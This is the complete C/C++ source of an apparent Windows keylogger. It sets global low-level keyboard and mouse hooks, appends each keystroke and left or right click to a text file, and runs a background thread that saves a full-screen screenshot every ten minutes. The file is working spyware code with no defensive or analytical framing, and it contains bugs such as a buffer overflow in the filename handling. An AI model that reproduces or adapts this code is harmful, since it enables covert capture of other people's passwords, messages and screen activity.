#include<stdio.h>
#include<windows.h>
#include<fstream>
#include<gdiplus.h>




void screenshot(int counter){
	//screen width & height
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	
	//gets the device context (source of the image)
	HDC source = GetDC(NULL);
	//creates a buffer to stores the image
	HDC memory = CreateCompatibleDC(source);
	
	HBITMAP hBitScreenshot = CreateCompatibleBitmap(source, screenWidth, screenHeight);
	SelectObject (memory, hBitScreenshot);
	
	BitBlt(memory, 0, 0, screenWidth, screenHeight, source, 0, 0, SRCCOPY);

    
    char filename[10];
    sprintf(filename, "screenshot.bmp");
	
	
	//https://learn.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-bitblt?redirectedfrom=MSDN
	BITMAPFILEHEADER bfHeader;
	BITMAPINFOHEADER biHeader;
	
	biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biWidth = screenWidth;
    biHeader.biHeight = -screenHeight; 
    biHeader.biPlanes = 1;
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biSizeImage = ((screenWidth * 3 + 3) & ~3) * screenHeight;
    biHeader.biXPelsPerMeter = 0;
    biHeader.biYPelsPerMeter = 0;
    biHeader.biClrUsed = 0;
    biHeader.biClrImportant = 0;

    int imageSize = biHeader.biSizeImage;
    char* imageData = (char*)malloc(imageSize);

    GetDIBits(memory, hBitScreenshot, 0, screenHeight, imageData, (BITMAPINFO*)&biHeader, DIB_RGB_COLORS);

    bfHeader.bfType = 0x4D42;  
    bfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + imageSize;
    bfHeader.bfReserved1 = 0;
    bfHeader.bfReserved2 = 0;
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    FILE* f = fopen("screenshot.jpg", "wb");
    fwrite(&bfHeader, sizeof(BITMAPFILEHEADER), 1, f);
    fwrite(&biHeader, sizeof(BITMAPINFOHEADER), 1, f);
    fwrite(imageData, imageSize, 1, f);
    fclose(f);
	
	DeleteObject(hBitScreenshot);
	DeleteDC(memory);
	ReleaseDC(NULL, source);
}

unsigned __stdcall ScreenshotThread(void* pArguments) {
    int count = 1;
    while (1) {
        screenshot(count++);
        Sleep(10 * 60 * 1000); 
    }
    return 0;
}


//keyboard inputs
LRESULT keyboardKeyLog(int code, WPARAM wparam, LPARAM lparam){
	
	
	
	KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *) lparam;
	if(wparam == WM_KEYDOWN){
		FILE *fptr;
		fptr = fopen("result.txt", "a");
		switch(pkey->vkCode){

			case VK_BACK:
				fprintf(fptr, "[back]\n");
				break;
			case VK_RETURN:
				fprintf(fptr, "[enter]\n");
				break;
			case VK_SPACE:
				fprintf(fptr, "[space]\n");
				break;
//			case WM_LBUTTONDOWN:
//				fprintf(fptr, "leftclick\n");
//				break;
			default:
				fprintf(fptr, "%c ", pkey->vkCode);
				break;
			
		}
		fclose(fptr);
		
	}
	
	
//	fclose(fptr);	
	
	return CallNextHookEx(NULL, code, wparam, lparam);
	
}

//for mouse inputs (left/right click)
LRESULT mouseKeyLog(int code, WPARAM wparam, LPARAM lparam){
	
		PMSLLHOOKSTRUCT mouse = (PMSLLHOOKSTRUCT) lparam;
		if(code>=0){
			FILE *fptr;
			fptr = fopen( "result.txt", "a");
			
			switch(wparam){
				
				case WM_LBUTTONDOWN:
					fprintf(fptr, "leftclick\n");
					break;
				case WM_RBUTTONDOWN:
					fprintf(fptr, "rightclick\n");
					break;
				
			}
			
			fclose(fptr);
			
		}
		
		return CallNextHookEx(NULL, code, wparam, lparam);
	
}




int main(){
	
	//creates a hook for both mouse and keyboard inputs
	HHOOK hookKeyboard = SetWindowsHookExA(WH_KEYBOARD_LL, keyboardKeyLog, NULL, 0);
	HHOOK hookMouse = SetWindowsHookExA(WH_MOUSE_LL, mouseKeyLog, NULL, 0);
	//if both hook fails
	if(hookKeyboard == NULL || hookMouse == NULL){
		
			printf("hook error");
		
	}
	
    _beginthreadex(NULL, 0, &ScreenshotThread, NULL, 0, NULL);

	MSG msg;
	while((GetMessage(&msg, NULL, 0, 0))!=0){
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	

	UnhookWindowsHookEx(hookKeyboard);
	UnhookWindowsHookEx(hookMouse);
	
}
